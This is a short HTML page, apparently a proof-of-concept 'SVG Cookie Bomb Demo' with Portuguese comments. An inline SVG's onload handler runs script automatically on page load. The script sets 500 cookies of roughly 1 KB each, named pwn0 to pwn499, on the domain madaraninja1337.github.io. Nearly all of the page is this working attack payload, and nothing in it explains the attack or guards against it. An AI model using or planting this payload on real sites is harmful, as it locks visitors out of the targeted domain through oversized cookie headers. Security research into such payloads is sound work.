<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>SVG Cookie Bomb Demo</title>
</head>
<body>
  <!-- SVG inline com cookie bomb -->
  <svg xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink"
       width="200" height="200"
       onload="bombCookies()">
    
    <!-- Quadrado central -->
    <rect x="25" y="25" width="150" height="150"
          fill="none" stroke="black" stroke-width="2"/>

    <!-- Imagem de fundo -->
    <image
      x="0" y="0"
      width="200" height="200"
      xlink:href="https://via.placeholder.com/200"
      preserveAspectRatio="none" />

    <script><![CDATA[
      function bombCookies() {
        const total = 500;
        const size  = 1024; // ~1 KB por cookie
        for (let i = 0; i < total; i++) {
          document.cookie =
            `pwn${i}=${'x'.repeat(size)};` +
            ` domain=madaraninja1337.github.io;` +
            ` path=/;`;
        }
      }
    ]]></script>
  </svg>
</body>
</html>
